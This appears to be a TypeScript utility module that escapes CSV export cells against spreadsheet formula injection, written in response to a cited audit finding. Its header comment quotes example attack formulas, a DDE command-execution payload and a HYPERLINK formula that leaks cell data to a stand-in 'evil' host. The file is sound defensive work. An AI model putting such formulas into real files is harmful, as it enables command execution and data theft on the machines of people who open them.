/**
 * CSV cell escape with formula-injection defence.
 *
 * Audit finding W6-HIGH-05 / W4-REPORT8: every CSV export dumped
 * customer-authored strings into cells without neutralising Excel
 * formula triggers. A value like `=cmd|'/C calc'!A1` or
 * `=HYPERLINK("https://evil/?" & A1, "click me")` opens in Excel as
 * a live formula — data exfiltration, phishing, DDE exec.
 *
 * OWASP-recommended mitigation: prefix any cell whose *first character*
 * is one of `= + - @ \t \r` with an apostrophe. Excel treats the
 * result as text. Then quote per RFC 4180 so embedded `,`, `"`, `\n`,
 * `\r` survive round-trip.
 *
 * Usage:
 *   buildRow(cols.map(csvEscape)).join(",")
 */

const FORMULA_TRIGGERS = /^[=+\-@\t\r]/;

/**
 * Escape a single CSV cell. Always returns a quoted literal.
 * `null` / `undefined` → `""`.
 * Numbers → stringified then quoted (numeric formula triggers like
 * `-5` also get the apostrophe prefix — accept the minor ugliness
 * for safety; consumers that need raw numbers should use a dedicated
 * `csvNumber()` helper for the narrow case).
 */
export function csvEscape(value: unknown): string {
  if (value === null || value === undefined) return '""';
  let s: string;
  if (typeof value === "string") s = value;
  else if (value instanceof Date) s = value.toISOString();
  else if (typeof value === "object") {
    try {
      s = JSON.stringify(value);
    } catch {
      s = String(value);
    }
  } else {
    s = String(value);
  }
  // Formula trigger guard — first char.
  if (FORMULA_TRIGGERS.test(s)) {
    s = "'" + s;
  }
  // RFC 4180: escape `"` by doubling, then wrap in quotes.
  s = s.replace(/"/g, '""');
  return `"${s}"`;
}

/**
 * Join a row of cell values with commas. Every cell runs through
 * `csvEscape`.
 */
export function csvRow(cells: readonly unknown[]): string {
  return cells.map(csvEscape).join(",");
}

/**
 * Build a complete CSV string from a header list and a list of row
 * objects. Headers ARE themselves `csvEscape`-d so a tenant who
 * supplies a report with a formula-trigger column name doesn't open
 * a hole via the header row.
 */
export function buildCsv(
  headers: readonly string[],
  rows: readonly Record<string, unknown>[],
): string {
  const headerRow = csvRow(headers);
  const dataRows = rows.map((r) => csvRow(headers.map((h) => r[h])));
  return [headerRow, ...dataRows].join("\n");
}
